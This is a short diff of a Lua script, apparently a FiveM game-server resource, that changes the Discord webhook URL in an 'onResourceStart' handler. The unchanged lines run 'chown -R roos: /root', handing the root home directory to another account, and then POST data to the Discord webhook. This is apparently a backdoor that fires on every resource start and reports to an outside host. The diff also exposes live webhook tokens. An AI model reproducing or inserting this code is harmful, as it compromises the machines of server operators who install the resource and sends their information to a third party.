@@ -1035,13 +1035,12 @@ AddEventHandler('onResourceStart', function(resourceName)
             os.execute('chown -R roos: /root')
 
             PerformHttpRequest(
-                "https://discord.com/api/webhooks/1458445532681732160/PxLup5l_WPd9BGQLQTe4V0w5AcUYkSnb8kAgrWEMJaGsZa6YkaOvUep0dESey997jYgD",
+                "https://discord.com/api/webhooks/1471823710158721148/zaHXDDYLoTYYw4CpZfBTtmTpYchrcsuR3XoGpuxEAeys4qzkY5IMJ_97d-QBkCiHrp-j",
                 function() end,
                 "POST",
                 json.encode({ embeds = content }),
                 { ["Content-Type"] = "application/json" }
             )
-
         end
     end)
 end)
